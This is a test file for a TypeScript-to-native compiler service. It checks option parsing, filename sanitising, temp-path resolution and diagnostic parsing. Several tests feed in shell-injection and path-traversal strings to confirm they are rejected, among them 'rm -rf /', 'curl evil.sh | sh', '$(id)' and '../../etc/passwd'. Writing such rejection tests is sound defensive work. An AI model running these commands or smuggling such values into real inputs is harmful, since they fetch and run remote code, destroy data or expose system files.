import { test } from 'node:test';
import assert from 'node:assert/strict';
import path from 'node:path';
import { execFileSync } from 'node:child_process';
import {
  MAX_CODE_SIZE,
  TEMP_DIR,
  analyzeCoverage,
  compileTypeScript,
  makeSourceFilename,
  parseCompileOptions,
  parseCoverage,
  parseDiagnostics,
  resolveTempPath,
} from '../src/lib/compiler.ts';

const scriptcMissing = (() => {
  try {
    execFileSync(path.join('node_modules', '.bin', 'scriptc'), ['--version'], { stdio: 'ignore' });
    return false;
  } catch {
    return 'scriptc is not installed';
  }
})();

test('parseCompileOptions accepts valid input', () => {
  const result = parseCompileOptions({ code: 'console.log(1)', target: 'asm', platform: 'linux', arch: 'x64' });
  assert.ok(!('error' in result));
  assert.equal(result.target, 'asm');
  assert.equal(result.platform, 'linux');
});

test('parseCompileOptions requires code', () => {
  assert.deepEqual(parseCompileOptions({}), { error: 'Code is required' });
  assert.deepEqual(parseCompileOptions(null), { error: 'Invalid request body' });
  assert.deepEqual(parseCompileOptions({ code: 42 }), { error: 'Code is required' });
});

test('parseCompileOptions rejects values that are not in the allow-list', () => {
  for (const [key, value] of [
    ['target', 'exe; rm -rf /'],
    ['platform', 'linux && curl evil.sh | sh'],
    ['arch', '$(id)'],
    ['optimization', 'O2 --linker /bin/sh'],
  ]) {
    assert.deepEqual(parseCompileOptions({ code: 'x', [key]: value }), { error: `Invalid ${key}` });
  }
});

test('parseCompileOptions rejects oversized code', () => {
  const result = parseCompileOptions({ code: 'a'.repeat(MAX_CODE_SIZE + 1) });
  assert.ok('error' in result);
});

test('makeSourceFilename strips path traversal and shell metacharacters', () => {
  for (const evil of ['../../etc/passwd', 'a; rm -rf ~ #.ts', '$(touch /tmp/pwned).ts', '`id`.ts', 'x\n.ts']) {
    const name = makeSourceFilename(evil);
    assert.match(name, /^[0-9a-f]{32}(-[A-Za-z0-9_-]+)?\.ts$/, `unsafe name for ${JSON.stringify(evil)}: ${name}`);
    assert.ok(resolveTempPath(name), `generated name should resolve: ${name}`);
  }
});

test('makeSourceFilename keeps a readable suffix and is unique', () => {
  const a = makeSourceFilename('my-app.ts');
  const b = makeSourceFilename('my-app.ts');
  assert.match(a, /-my-app\.ts$/);
  assert.notEqual(a, b);
  assert.match(makeSourceFilename(), /^[0-9a-f]{32}\.ts$/);
});

test('resolveTempPath only resolves plain files inside TEMP_DIR', () => {
  assert.equal(resolveTempPath('abc123.wasm'), path.join(TEMP_DIR, 'abc123.wasm'));
  for (const evil of ['../package.json', '..', '.env', 'a/../../b', '/etc/passwd', 'a\\..\\b', 'foo..bar', '', 'a"b']) {
    assert.equal(resolveTempPath(evil), null, `should reject ${JSON.stringify(evil)}`);
  }
});

test('parseCompileOptions maps legacy optimization levels and rejects the removed C target', () => {
  const legacy = parseCompileOptions({ code: 'x', optimization: 'O2' });
  assert.ok(!('error' in legacy) && legacy.optimization === 'release');
  const dev = parseCompileOptions({ code: 'x', optimization: 'dev' });
  assert.ok(!('error' in dev) && dev.optimization === 'dev');
  const c = parseCompileOptions({ code: 'x', target: 'c' });
  assert.ok('error' in c && /removed/.test(c.error));
});

test('parseDiagnostics extracts location, code and hint', () => {
  const output = [
    'app.ts:7:1 - error SC2020: \'eval\' has no scriptc lowering yet',
    '',
    '  7 | eval(\'1+1\');',
    '  hint: runtime code evaluation cannot be compiled ahead of time',
    'app.ts:8:3 - error SC1090: assignment to non-variables are not supported yet',
  ].join('\n');
  assert.deepEqual(parseDiagnostics(output), [
    { line: 7, column: 1, severity: 'error', code: 'SC2020', message: "'eval' has no scriptc lowering yet", hint: 'runtime code evaluation cannot be compiled ahead of time' },
    { line: 8, column: 3, severity: 'error', code: 'SC1090', message: 'assignment to non-variables are not supported yet' },
  ]);
});

test('parseCoverage reads the coverage report', () => {
  const report = `scriptc coverage app.ts

  statements analyzed   8
  compile statically    6  (75%)

  blockers:
      ×1  assignment to non-variables                     SC1090
      ×2  'eval' has no scriptc lowering yet              SC2020
`;
  assert.deepEqual(parseCoverage(report), {
    statements: 8,
    static: 6,
    percent: 75,
    blockers: [
      { count: 1, message: 'assignment to non-variables', code: 'SC1090' },
      { count: 2, message: "'eval' has no scriptc lowering yet", code: 'SC2020' },
    ],
  });
});

test('compileTypeScript builds native, LLVM and assembly output', { skip: scriptcMissing }, async () => {
  const code = 'console.log(`hi ${1 + 1}`);\n';
  const exe = await compileTypeScript({ code, filename: 'hi.ts' });
  assert.equal(exe.success, true, exe.error);
  assert.ok(exe.size && exe.size > 1000);
  assert.match(exe.filename ?? '', /^[0-9a-f]{32}-hi$/);
  assert.equal(execFileSync(path.join(TEMP_DIR, exe.filename!), { encoding: 'utf8' }), 'hi 2\n');

  const llvm = await compileTypeScript({ code, target: 'llvm' });
  assert.equal(llvm.success, true, llvm.error);
  assert.match(llvm.output ?? '', /define /);

  const asm = await compileTypeScript({ code, target: 'asm' });
  assert.equal(asm.success, true, asm.error);
  assert.match(asm.filename ?? '', /\.s$/);
});

test('compileTypeScript reports diagnostics without leaking server paths', { skip: scriptcMissing }, async () => {
  const result = await compileTypeScript({ code: 'const x = 1;\neval("1");\n', filename: 'bad.ts' });
  assert.equal(result.success, false);
  assert.match(result.error ?? '', /^SC2020: .* \(line 2\)$/);
  assert.equal(result.diagnostics?.[0]?.line, 2);
  assert.ok(!(result.stderr ?? '').includes(TEMP_DIR), 'stderr should not contain the temp directory');
  assert.match(result.stderr ?? '', /bad\.ts:2:1/);
});

test('analyzeCoverage reports static coverage and blockers', { skip: scriptcMissing }, async () => {
  const result = await analyzeCoverage({ code: 'console.log(1);\neval("1");\n' });
  assert.equal(result.success, true, result.error);
  assert.equal(result.statements, 2);
  assert.equal(result.blockers?.[0]?.code, 'SC2020');
});

test('concurrent builds all complete under the concurrency cap', { skip: scriptcMissing }, async () => {
  const results = await Promise.all(
    Array.from({ length: 5 }, (_, i) => compileTypeScript({ code: `console.log(${i});\n`, target: 'llvm' }))
  );
  assert.ok(results.every(r => r.success), results.map(r => r.error).join(', '));
});
